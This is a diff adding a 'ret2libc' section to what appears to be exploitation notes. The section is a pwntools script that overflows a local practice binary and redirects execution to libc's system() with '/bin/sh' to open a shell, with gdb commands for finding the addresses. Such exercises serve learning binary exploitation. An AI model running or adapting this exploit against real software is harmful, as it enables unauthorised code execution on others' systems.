@@ -50,3 +50,32 @@ p.send(code)
 p.interactive()
 
 ```
+## ret2libc
+```
+#!/usr/bin/env python3
+from pwn import *
+import binascii
+
+p = process('./rop_ep')
+
+# system() address in libc. 
+# gdb$ break main 
+# gdb$ run
+# gdb$ print system  
+system = 0xf7e132e0
+
+# "/bin/sh" in libc.
+# gdb$ print __libc_start_main
+# gdb$ find &libc_main(), +22000, "/bin/sh"
+param = 0xf7f540af
+
+code = bytes(('A' * 140).encode())
+code += p32(system) 
+code += p32(0xdeadbeef)
+code += p32(param)
+print (binascii.hexlify(bytearray(code)))
+
+p.send(code)
+
+p.interactive()
+```
